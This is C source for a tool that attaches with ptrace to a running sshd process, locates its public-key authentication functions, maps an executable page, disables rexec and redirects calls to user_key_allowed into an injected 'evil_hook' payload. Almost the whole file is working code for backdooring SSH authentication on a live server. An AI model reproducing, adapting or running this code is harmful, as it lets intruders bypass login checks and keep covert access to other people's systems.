#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <types.h>
#include <common.h>
#include <map.h>
#include <inject.h>
#include <sig.h>
#include <ptrace.h>
#include <callcache.h>
#include <util.h>
#include <elflib.h>

extern u8 *evil_hook;
extern u64 evil_hook_size;

u8 *dynsym, *dynstr;
int dynsym_sz, dynstr_sz;

u8 *symtab, *strtab;
int symtab_sz, strtab_sz;

signature signatures[]={
	{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
	{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , 0 },
	{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 },
	{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
	{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 },
	{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 }
//	{ 0x3333333344444444, "uauth_passwd", "password change not supported", 0 }
};

u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
	char rdibuf[]="\x48\x8d\x3d\x00\x00\x00\x00";
	int *rptr= (int*)&rdibuf[3];
	u64 str_addr, lea_addr = 0, rdiff=0, rtop=0;
	callcache_entry *callcache, *entry;
	u32 callcache_total;
	int i, j;
	mem_mapping *mapping;

	callcache = get_callcache();
	callcache_total = get_callcachetotal();

	str_addr = find_sig_mem(ctx, (u8*)str, strlen(str), MEM_R);

	if (str_addr == 0)
		error("could not locate str '%s'", str);

	for(i = 0; i < ctx->num_maps; i++) {
		mapping = ctx->mappings[i];

		if ((mapping->perm & (MEM_R | MEM_X)) != (MEM_R | MEM_X))
			continue;

		for(j = 0; j < mapping->size-7; j++) {
			*rptr = str_addr - (mapping->start+j+7);
			if (memcmp(mapping->data+j, rdibuf, 7) == 0) {
				lea_addr = mapping->start+j;
			}
		}
	}

	if (lea_addr == 0) 
		error("could not find 'lea' insn for str '%s'", str);

	rdiff=0x313337;
	rtop=0;

	for(i=0; i<callcache_total; i++) {
		entry = &callcache[i];
		if (entry->dest < lea_addr) {
			if (lea_addr - entry->dest < rdiff) {
				rdiff = lea_addr - entry->dest;
				rtop = entry->dest;
			}
		}
	}

	return rtop;
}

int main(int argc, char *argv[]) {
	char line[255], sshd_path[255], proc_exe[64];
	int i, j;

	u32 nullw=0, callcache_total;
	callcache_entry *callcache, *entry;
	u64 diff=0, hole_addr=0, rexec_flag;
	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
	u32 num_key_allowed2_calls=0;
	u8 *evil_bin;

	mem_mapping *m1, *m2;

	if (argc != 3) {
		fprintf(stderr, "usage: %s <pid>\n", argv[0]);
		return -1;
	}

	inject_ctx *ctx = malloc(sizeof(inject_ctx));

	ctx->pid     = atoi(argv[1]);

	_attach(ctx->pid);
	info("slurping stuff to memory..");
	map_init();
	ctx->num_maps = map_load_all(ctx);
	info("loaded %d memory mappings", ctx->num_maps);

	evil_bin = malloc(evil_hook_size);
	memcpy(evil_bin, evil_hook, evil_hook_size);

	ctx->mappings = get_mappings();

	sort_maps(ctx);

	memset(sshd_path, 0, 255);
	sprintf(proc_exe, "/proc/%d/exe", atoi(argv[1]));
	readlink(proc_exe, sshd_path, 255);

	info("sshd binary path = '%s'", sshd_path);

	// locate syscall instruction
	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
	info("syscall\t\t= \x1b[37m0x%lx", ctx->sc_addr);

	// lookup 'rexec_flag' through dynsym/symtab
	dynsym_sz = get_section(sshd_path, ".dynsym", &dynsym);
	dynstr_sz = get_section(sshd_path, ".dynstr", &dynstr);

	if (dynsym == 0 || dynstr == 0)
		error("could not find dynsym.\n");

	rexec_flag = ctx->elf_base + resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, "rexec_flag");

	if (rexec_flag == ctx->elf_base) {
		info("could not resolve rexec_flag through dynsym.. trying symtab!");

		symtab_sz = get_section(sshd_path, ".symtab", &symtab);
		strtab_sz = get_section(sshd_path, ".strtab", &strtab);

		if (symtab == 0 || strtab == 0)
			error("could not find symtab.\n");

		rexec_flag = ctx->elf_base + resolve_symbol(symtab, symtab_sz, (char*)strtab, "rexec_flag");

		if (rexec_flag == ctx->elf_base) {
			error("could not resolve rexec_flag through symtab EITHER :((");
		}
	}

	info("rexec_flag\t\t= 0x%lx", rexec_flag); 

	cache_calltable(ctx);

	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
		signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
		if (signatures[i].addr == 0) {
			error("%s not found :(\n", signatures[i].name);
		}

		sprintf(line, "%s\t\t= \x1b[37m0x%lx", signatures[i].name, signatures[i].addr);

		for(j = 0; j < evil_hook_size - 8; j++) {
			u64 *vptr = (u64*)&evil_bin[j];
			if (*vptr == signatures[i].placeholder) {
				sprintf(
					line+strlen(line), 
					" .. [%lx] at offset %x in evil_bin!", 
					signatures[i].placeholder, j
				);

				*vptr = signatures[i].addr;
				break;
			}
		}
		info(line);
	}

	callcache = get_callcache();
	callcache_total = get_callcachetotal();

	for(i=0; i<callcache_total; i++) {
		entry = &callcache[i];
		if (entry->dest == signatures[0].addr) {
			info("found a 'call user_key_allowed' @ 0x%lx", entry->addr);
			user_key_allowed2_calls[num_key_allowed2_calls] = entry->addr;
			num_key_allowed2_calls++;
		}
	}

	if (num_key_allowed2_calls == 0)
		error("no call to user_key_allowed2 found :(");

	// find a neighborly memoryhole where we can mmap
	for(i=0; i < ctx->num_maps; i++) {
		m1 = ctx->mappings[i];
		m2 = ctx->mappings[i+1];

		if(
			user_key_allowed2_calls[0] >= m1->start &&
			m2->start > (m1->end + 0x1000)
		) {
			hole_addr = m1->end;

			break;
		}
	}
	
	if (hole_addr == 0) {
		error("unable to find neighborly hole.");
	}

	info("found usable hole @ 0x%lx", hole_addr);

	info2("entering critical phase");

	_mmap(
		ctx, (void*)hole_addr, 0x1000,
		PROT_READ| PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
		0, 0
	);

	info("switching off rexec..");
	_poke(ctx->pid, rexec_flag, &nullw, 4);

	for(i=0; i<num_key_allowed2_calls; i++) {
		diff = 0x100000000-(user_key_allowed2_calls[i]-hole_addr)-5;

		info(
			"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
			user_key_allowed2_calls[i], hole_addr,
			diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
		);

		_poke(ctx->pid, user_key_allowed2_calls[i]+1, &diff, 4);
	}

	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
	_poke(ctx->pid, hole_addr+(evil_hook_size), argv[2], strlen(argv[2]));
	info("poked evil_bin to 0x%lx.", hole_addr);

	_detach(ctx->pid);
	info("detached.\n");
	free(ctx);
	return 0;
}
